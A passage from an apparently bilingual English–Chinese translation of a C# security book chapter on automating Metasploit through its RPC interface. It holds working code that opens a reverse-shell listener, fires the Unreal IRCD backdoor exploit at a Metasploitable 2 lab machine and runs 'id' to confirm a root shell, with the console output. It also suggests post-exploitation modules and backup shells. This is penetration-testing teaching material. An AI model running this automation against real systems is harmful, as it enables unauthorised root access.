    Metasploitable 2 的特定 RPC 方法。例如，我们使用 ListJobs() 方法 ➋ 来监控我们的 exploit，以便在 exploit
    完成时知道，并可以在目标机器上运行命令。
- en: We use the ReadSessionShell() method ➍ to read any output resulting from running
    a command with the session. The WriteToSessionShell() method ➎, conversely, writes
    any commands to the shell to be executed. The ExecuteModule() method ➌ takes a
    module to execute and the options to use when executing the module. Each method
    uses Execute() to execute a given RPC method and return the results to the caller.
    We’ll discuss each method as we make the finishing touches to drive Metasploit
    in the next sections.
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用 ReadSessionShell() 方法 ➍ 来读取运行命令时通过会话产生的任何输出。相反，WriteToSessionShell() 方法
    ➎ 将任何命令写入 shell 以便执行。ExecuteModule() 方法 ➌ 接受一个要执行的模块和执行该模块时使用的选项。每个方法都使用 Execute()
    执行给定的 RPC 方法，并将结果返回给调用者。我们将在接下来的章节中讨论每个方法，并完成驱动 Metasploit 的最后步骤。
- en: Putting It All Together
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 整合所有内容
- en: Now we can use our classes to begin automating exploitation via Metasploit.
    First, let’s write a Main() method to listen for a connect-back shell and then
    run an exploit that causes Metasploitable to connect back to our listener with
    a new session (see [Listing 11-12](#filepos803743)).
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以使用我们的类开始通过 Metasploit 自动化利用过程。首先，编写一个 Main() 方法来监听连接回来的 shell，然后运行一个
    exploit，使 Metasploitable 连接回我们的监听器并建立一个新会话（参见 [Listing 11-12](#filepos803743)）。
- en: public static void Main(string[] args)
  id: totrans-271
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-272
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: ➊string listenAddr = args[1];
  id: totrans-273
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊string listenAddr = args[1];
- en: int listenPort = 4444;
  id: totrans-274
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: int listenPort = 4444;
- en: string payload = "cmd/unix/reverse";
  id: totrans-275
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string payload = "cmd/unix/reverse";
- en: ''
  id: totrans-276
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (➋MetasploitSession session = new MetasploitSession("username",
  id: totrans-277
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (➋MetasploitSession session = new MetasploitSession("username",
- en: '"password", "http://"+listenAddr+":55553/api"))'
  id: totrans-278
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '"password", "http://"+listenAddr+":55553/api"))'
- en: '{'
  id: totrans-279
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (string.IsNullOrEmpty(session.➌Token))
  id: totrans-280
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrEmpty(session.➌Token))
- en: throw new Exception("Login failed. Check credentials");
  id: totrans-281
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: throw new Exception("登录失败。检查凭据");
- en: ''
  id: totrans-282
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (MetasploitManager manager = new ➍MetasploitManager(session))
  id: totrans-283
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (MetasploitManager manager = new ➍MetasploitManager(session))
- en: '{'
  id: totrans-284
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Dictionary<object, object> response = null;
  id: totrans-285
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Dictionary<object, object> response = null;
- en: ''
  id: totrans-286
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ➎Dictionary<object, object> opts = new Dictionary<object, object>();
  id: totrans-287
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➎Dictionary<object, object> opts = new Dictionary<object, object>();
- en: opts["ExitOnSession"] = false;
  id: totrans-288
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["ExitOnSession"] = false;
- en: opts["PAYLOAD"] = payload;
  id: totrans-289
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["PAYLOAD"] = payload;
- en: opts["LHOST"] = listenAddr;
  id: totrans-290
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["LHOST"] = listenAddr;
- en: opts["LPORT"] = listenPort;
  id: totrans-291
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["LPORT"] = listenPort;
- en: ''
  id: totrans-292
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: response = manager.➏ExecuteModule("exploit", "multi/handler", opts);
  id: totrans-293
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: response = manager.➏ExecuteModule("exploit", "multi/handler", opts);
- en: 'object jobID = response["job_id"]; Listing 11-12: The beginning of the  Main()  method
    for automating the  MetasploitSession  and  MetasploitManager  classes'
  id: totrans-294
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'object jobID = response["job_id"]; Listing 11-12: 开始使用 Main() 方法自动化 MetasploitSession
    和 MetasploitManager 类'
- en: 'Next, we define a few variables for later use ➊: the address and port for Metasploit
    to listen on for a connection back and the payload to be sent to Metasploitable.
    Then, we create a new MetasploitSession class ➋ and check the session Token property
    ➌ to confirm authentication. Once we know that we are authenticated, we pass the
    session to a new MetasploitManager ➍ so that we can begin exploitation.'
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们定义一些后续使用的变量 ➊：Metasploit 用于监听回连接的地址和端口，以及要发送到 Metasploitable 的有效载荷。然后，我们创建一个新的
    MetasploitSession 类 ➋ 并检查会话的 Token 属性 ➌ 以确认身份验证。确认身份后，我们将会话传递给新的 MetasploitManager
    ➍，以便我们开始利用过程。
- en: At ➎, we create a dictionary to hold the options to send to Metasploit when
    we begin listening for a connect-back, namely ExitOnSession, PAYLOAD, LHOST, and
    LPORT. The ExitOnSession option is a Boolean value that dictates whether the listener
    will stop when a session connects. If this value is true, the listener will stop.
    If it’s false, the listener will continue to listen for new shells. The PAYLOAD
    option is a string that tells Metasploit what kind of connect-back payload the
    listener should expect. LPORT and LHOST are the port and the IP address to listen
    on, respectively. We pass these options to the multi/handler exploit module (which
    listens for a connect-back shell from Metasploitable) using the ExecuteModule()
    ➏, which starts a job to listen for the connect-back shell. The job ID is returned
    by ExecuteModule() and stored for later use.
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 在 ➎ 处，我们创建了一个字典来存储在开始监听回连时发送给 Metasploit 的选项，即 ExitOnSession、PAYLOAD、LHOST 和
    LPORT。ExitOnSession 选项是一个布尔值，用来指示当会话连接时监听器是否会停止。如果这个值为 true，监听器将停止；如果为 false，监听器将继续监听新的
    shell。PAYLOAD 选项是一个字符串，用来告诉 Metasploit 监听器应该期待什么样的回连负载。LPORT 和 LHOST 分别是要监听的端口和
    IP 地址。我们将这些选项传递给 multi/handler 漏洞利用模块（它监听来自 Metasploitable 的回连 shell），并通过 ExecuteModule()
    ➏ 启动一个任务来监听回连 shell。ExecuteModule() 返回的任务 ID 被存储以备后续使用。
- en: Running the Exploit
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 运行漏洞利用
- en: '[Listing 11-13](#filepos806741) shows how to add the code to run the actual
    exploit against Metasploitable.'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: '[列表 11-13](#filepos806741) 显示了如何添加代码来对 Metasploitable 执行实际的漏洞利用。'
- en: opts = new Dictionary<object, object>();
  id: totrans-299
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts = new Dictionary<object, object>();
- en: opts["RHOST"] = args[0];
  id: totrans-300
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["RHOST"] = args[0];
- en: opts["DisablePayloadHandler"] = true;
  id: totrans-301
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["DisablePayloadHandler"] = true;
- en: opts["LHOST"] = listenAddr;
  id: totrans-302
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["LHOST"] = listenAddr;
- en: opts["LPORT"] = listenPort;
  id: totrans-303
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["LPORT"] = listenPort;
- en: opts["PAYLOAD"] = payload;
  id: totrans-304
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: opts["PAYLOAD"] = payload;
- en: ''
  id: totrans-305
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'manager.➊ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
    Listing 11-13: Running the Unreal IRCD exploit via the RPC'
  id: totrans-306
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: manager.➊ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
    列表 11-13：通过 RPC 运行 Unreal IRCD 漏洞利用
- en: As we did earlier, we set up the module datastore options in a dictionary before
    calling ExecuteModule() ➊ and passing it the unix/irc/unreal_ircd_ 3281_backdoor
    exploit module name and options (see [Listing 11-14](#filepos807772)).
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们之前所做的，我们在调用 ExecuteModule() ➊ 之前在字典中设置了模块的数据存储选项，并传递了 unix/irc/unreal_ircd_3281_backdoor
    漏洞利用模块名称和选项（参见[列表 11-14](#filepos807772)）。
- en: response = manager.➊ListJobs();
  id: totrans-308
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: response = manager.➊ListJobs();
- en: 'while (response.➋ContainsValue("Exploit: unix/irc/unreal_ircd_3281_backdoor"))'
  id: totrans-309
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'while (response.➋ContainsValue("Exploit: unix/irc/unreal_ircd_3281_backdoor"))'
- en: '{'
  id: totrans-310
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Console.WriteLine("Waiting");
  id: totrans-311
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("等待");
- en: System.Threading.Thread.Sleep(10000);
  id: totrans-312
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: System.Threading.Thread.Sleep(10000);
- en: response = manager.➌ListJobs();
  id: totrans-313
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: response = manager.➌ListJobs();
- en: '}'
  id: totrans-314
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-315
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: response = manager.➍StopJob(jobID.ToString());
  id: totrans-316
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: response = manager.➍StopJob(jobID.ToString());
- en: 'Listing 11-14: Watching until the Unreal IRC exploit is finished running'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-14：观察直到 Unreal IRC 漏洞利用完成运行
- en: The ListJobs() method ➊ returns a list of all jobs currently running on the
    Metasploit instance as a list of strings with the module name in them. If the
    list contains the name of the module we are running, our exploit hasn’t finished,
    so we need to wait a bit and recheck until our module is no longer listed. If
    ContainsValue() ➋ returns true, then our module is still running, so we sleep
    and call ListJobs() ➌ again until the exploit module is no longer listed in the
    jobs, which means it has finished running. Now we should have a shell. Finally,
    we turn off the multi/handler exploit module with StopJob() ➍ by passing it the
    job ID we stored earlier.
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: ListJobs() 方法 ➊ 返回当前在 Metasploit 实例上运行的所有任务的字符串列表，模块名称包含在其中。如果列表中包含我们正在运行的模块名称，说明我们的漏洞利用尚未完成，因此我们需要等待一段时间并重新检查，直到我们的模块不再列出。如果
    ContainsValue() ➋ 返回 true，表示我们的模块仍在运行，因此我们会暂停并再次调用 ListJobs() ➌，直到漏洞利用模块不再出现在任务列表中，这意味着它已经完成运行。现在我们应该已经有了一个
    shell。最后，我们通过传递先前存储的任务 ID，使用 StopJob() ➍ 关闭 multi/handler 漏洞利用模块。
- en: Interacting with the Shell
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 与 Shell 交互
- en: We should now be able to interact with the new shell. To test the connection,
    we run a simple command to confirm we have the access we want, as shown in [Listing
    11-15](#filepos809980).
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们应该能够与新的 shell 进行交互。为了测试连接，我们运行一个简单的命令来确认我们已经获得了所需的访问权限，如[列表 11-15](#filepos809980)所示。
- en: response = manager.➊ListSessions();
  id: totrans-321
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: response = manager.➊ListSessions();
- en: foreach (var pair in response)
  id: totrans-322
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (var pair in response)
- en: '{'
  id: totrans-323
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string sessionID = pair.Key.ToString();
  id: totrans-324
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string sessionID = pair.Key.ToString();
- en: manager.➋WriteToSessionShell(sessionID, "id\n");
  id: totrans-325
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: manager.➋WriteToSessionShell(sessionID, "id\n");
- en: System.Threading.Thread.Sleep(1000);
  id: totrans-326
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: System.Threading.Thread.Sleep(1000);
- en: response = manager.➌ReadSessionShell(sessionID);
  id: totrans-327
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: response = manager.➌ReadSessionShell(sessionID);
- en: 'Console.WriteLine("We are user: " + response ["data"]);'
  id: totrans-328
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine("我们是用户: " + response ["data"]);'
- en: 'Console.WriteLine("Killing session: " + sessionID);'
  id: totrans-329
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("结束会话： " + sessionID);
- en: manager.➍StopSession(sessionID);
  id: totrans-330
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: manager.➍StopSession(sessionID);
- en: '}'
  id: totrans-331
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-332
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-333
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-334
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-15: Retrieving the list of the current sessions and printing the
    results'
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 11-15：检索当前会话列表并打印结果
- en: At ➊, we call ListSessions(), which returns a list of the session IDs and general
    information about the sessions, such as session type. As we iterate over each
    session (there should only be one, unless you run the exploit multiple times!),
    we use the WriteToSessionShell() method ➋ to write the id command to the session
    shell, then sleep for a bit, and read the response using ReadSessionShell() ➌.
    Finally, we write the results of running id on the compromised system and then
    kill the session with StopSession() ➍.
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: 在 ➊，我们调用 ListSessions()，它返回会话 ID 列表以及有关会话的一般信息，如会话类型。在我们遍历每个会话时（除非你多次运行漏洞，否则应该只有一个会话！），我们使用
    WriteToSessionShell() 方法 ➋ 将 id 命令写入会话 shell，然后暂停片刻，使用 ReadSessionShell() ➌ 读取响应。最后，我们写出在被控制的系统上运行
    id 命令的结果，然后使用 StopSession() ➍ 结束该会话。
- en: Popping Shells
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: 打开 Shell
- en: 'Now we can run the automation and pop some easy shells. The program must be
    run with two arguments: the host to exploit and the IP address Metasploit should
    listen on for shells, as [Listing 11-16](#filepos811737) shows.'
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以运行自动化程序并打开一些简单的 shell。程序必须使用两个参数运行：一个是要利用的主机，另一个是 Metasploit 用于监听 shell
    的 IP 地址，正如[示例 11-16](#filepos811737)所示。
- en: $ ./ch11_automating_metasploit.exe 192.168.0.18 192.168.0.2
  id: totrans-339
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ ./ch11_automating_metasploit.exe 192.168.0.18 192.168.0.2
- en: Waiting
  id: totrans-340
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 等待中
- en: Waiting
  id: totrans-341
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 等待中
- en: Waiting
  id: totrans-342
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 等待中
- en: Waiting
  id: totrans-343
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 等待中
- en: Waiting
  id: totrans-344
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 等待中
- en: 'We are user: ➊uid=0(root) gid=0(root)'
  id: totrans-345
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 我们是用户：➊uid=0(root) gid=0(root)
- en: ''
  id: totrans-346
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Killing session: 3'
  id: totrans-347
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 结束会话：3
- en: $
  id: totrans-348
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $
- en: 'Listing 11-16: Running the Unreal IRC exploit automation, showing we have a
    root shell'
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 11-16：运行 Unreal IRC 漏洞自动化，显示我们已经获得 root shell
- en: If everything has worked correctly, we should now have a root shell ➊, and we
    can run some post-exploitation modules against Metasploitable using C# automation,
    or perhaps just spin off a few backup shells in case this one goes dark. The post/linux/gather/enum_configs
    module is a common post-exploit module for Linux. You could update your automation
    to run this or any of the post/linux/gather/enum_* modules after popping the initial
    shell on Metasploitable.
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一切正常，我们现在应该已经获得 root shell ➊，并且我们可以使用 C# 自动化运行一些后期利用模块，或者在这个 shell 消失的情况下创建一些备用
    shell。post/linux/gather/enum_configs 模块是 Linux 的常见后期利用模块。你可以更新你的自动化程序，在获得 Metasploitable
    的初始 shell 后，运行这个或任何 post/linux/gather/enum_* 模块。
- en: This is just the beginning of the very cool things you can drive the Meta sploit
    Framework to do, from discovery to exploitation. As mentioned earlier, Metasploit
    even has a place in post-exploitation with many modules for several operating
    systems. You can also drive discovery using the auxiliary scanner modules in auxiliary/scanner/*.
    A neat exercise would be to take the cross-platform Metasploit payload we wrote
    in [Chapter 4](index_split_009.html#filepos344540) and dynamically generate shellcode
    via the RPC and create dynamic payloads.
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 这只是你可以驱动 Metasploit 框架做的非常酷的事情的开始，从发现到利用。如前所述，Metasploit 甚至在后期利用阶段也有一席之地，提供了许多适用于多个操作系统的模块。你还可以通过辅助扫描模块（位于
    auxiliary/scanner/*）来驱动发现。一个很棒的练习是，使用我们在[第 4 章](index_split_009.html#filepos344540)中编写的跨平台
    Metasploit 负载，通过 RPC 动态生成 shellcode，并创建动态负载。
- en: Conclusion
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 结论
- en: In this chapter, you learned how to create a small set of classes to programmatically
    drive Metasploit via the RPC interface. Using basic HTTP libraries and a third-party
    MSGPACK library, we were able to exploit the Metasploitable 2 virtual machine
    with the Unreal IRCD backdoor and then run a command on the shelled machine to
    prove we had a root shell.
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你学习了如何创建一组小的类，通过 RPC 接口以编程方式驱动 Metasploit。通过使用基本的 HTTP 库和第三方 MSGPACK 库，我们成功地利用了
    Metasploitable 2 虚拟机的 Unreal IRCD 后门，然后在已被控制的机器上运行命令，以证明我们已经获得了 root shell。
- en: We have only touched on the power of the Metasploit RPC in this chapter. I highly
    encourage you to dig deeper into the potential of building Metasploit into change
    management or software development life cycle processes in your corporate environments
    to ensure misconfigurations or vulnerable software is not reintroduced to a data
    center or network with automatic scanning. At home, you can easily automate new
    device discovery with the Nmap integration that Metasploit ships with to find
    any new phones or gadgets your kids may not have told you about. The possibilities
    are limitless when it comes to the flexibility and power of the Metasploit Framework.
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们仅触及了Metasploit RPC的强大功能。我强烈鼓励你深入挖掘将Metasploit应用于变更管理或软件开发生命周期过程中的潜力，以确保在公司环境中，错误配置或脆弱的软件不会通过自动扫描重新引入到数据中心或网络中。在家里，你可以轻松地通过Metasploit自带的Nmap集成功能，自动发现新设备，找出你的孩子可能没有告诉你的新手机或小玩意。当谈到Metasploit框架的灵活性和强大功能时，可能性是无限的。
